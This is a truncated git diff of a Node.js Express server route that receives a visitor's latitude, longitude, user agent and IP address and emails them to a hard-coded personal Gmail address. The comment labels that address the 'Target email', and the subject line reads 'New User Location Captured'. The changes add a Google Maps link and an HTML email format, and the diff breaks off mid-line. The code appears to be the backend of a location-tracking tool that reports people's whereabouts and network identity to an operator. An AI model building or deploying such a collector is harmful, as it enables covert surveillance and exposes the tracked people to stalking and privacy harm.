@@ -1,13 +1,3 @@
-const express = require("express");
-const nodemailer = require("nodemailer");
-const bodyParser = require("body-parser");
-const cors = require("cors");
-
-const app = express();
-app.use(cors());
-app.use(bodyParser.json());
-
-// Email route
 app.post("/send-location-email", async (req, res) => {
     const { latitude, longitude, userAgent, ip } = req.body;
 
@@ -24,27 +14,15 @@ app.post("/send-location-email", async (req, res) => {
         }
     });
 
+    // Create Google Maps link
+    const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
     const mailOptions = {
         from: "sumitprasad035@gmail.com",
-        to: "sumitprasad035@gmail.com",      // Target email
-        subject: "New User Location",
-        text: `Coordinates:
-Latitude: ${latitude}
-Longitude: ${longitude}
-
-User Agent: ${userAgent}
-IP: ${ip}`
-    };
-
-    try {
-        await transporter.sendMail(mailOptions);
-        console.log("Email sent with location:", latitude, longitude);
-        res.send({ success: true });
-    } catch (error) {
-        console.error("Error sending email:", error);
-        res.status(500).send("Email failed");
-    }
-});
-
-const PORT = process.env.PORT || 5000;
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+        to: "sumitprasad035@gmail.com", // Target email
+        subject: "New User Location Captured",
+        html: `
+            <h3>User Location Details</h3>
+            <p><b>Latitude:</b> ${latitude}</p>
+            <p><b>Longitude:</b> ${longitude}</p>
+            <p><a href=
